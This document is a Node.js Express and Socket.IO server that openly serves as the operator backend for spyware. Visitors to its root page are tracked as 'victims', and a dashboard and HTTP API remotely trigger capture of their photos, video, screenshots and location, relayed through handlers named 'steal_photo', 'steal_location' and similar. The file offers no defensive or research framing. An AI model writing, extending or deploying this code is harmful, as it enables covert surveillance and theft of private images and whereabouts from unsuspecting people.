const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, 'public')));

let victims = new Map();

io.on('connection', (socket) => {
    console.log('🎯 Victim connected:', socket.id);
    victims.set(socket.id, { socket, id: socket.id });
    
    socket.on('steal_photo', (data) => {
        io.emit('new_photo', { ...data, victimId: socket.id, timestamp: Date.now() });
    });
    
    socket.on('steal_video', (data) => {
        io.emit('new_video', { ...data, victimId: socket.id, timestamp: Date.now() });
    });
    
    socket.on('steal_screenshot', (data) => {
        io.emit('new_screenshot', { ...data, victimId: socket.id, timestamp: Date.now() });
    });
    
    socket.on('steal_location', (data) => {
        io.emit('new_location', { ...data, victimId: socket.id });
    });
    
    socket.on('dashboard_join', () => {
        socket.join('dashboard');
        console.log('🖥️ Dashboard connected');
    });
    
    socket.on('request_photo', (victimId) => {
        const victim = victims.get(victimId);
        if (victim) victim.socket.emit('capture_photo');
    });
    
    socket.on('request_video', (victimId) => {
        const victim = victims.get(victimId);
        if (victim) victim.socket.emit('capture_video');
    });
    
    socket.on('request_screenshot', (victimId) => {
        const victim = victims.get(victimId);
        if (victim) victim.socket.emit('capture_screenshot');
    });
    
    socket.on('disconnect', () => {
        victims.delete(socket.id);
        io.emit('victim_disconnected', socket.id);
    });
});

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
});

app.get('/api/victims', (req, res) => {
    res.json(Array.from(victims.keys()));
});

app.post('/api/capture/photo/:victimId', (req, res) => {
    const victim = victims.get(req.params.victimId);
    if (victim) { victim.socket.emit('capture_photo'); res.json({ success: true }); }
    else res.json({ success: false });
});

app.post('/api/capture/video/:victimId', (req, res) => {
    const victim = victims.get(req.params.victimId);
    if (victim) { victim.socket.emit('capture_video'); res.json({ success: true }); }
    else res.json({ success: false });
});

app.post('/api/capture/screenshot/:victimId', (req, res) => {
    const victim = victims.get(req.params.victimId);
    if (victim) { victim.socket.emit('capture_screenshot'); res.json({ success: true }); }
    else res.json({ success: false });
});

const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
});
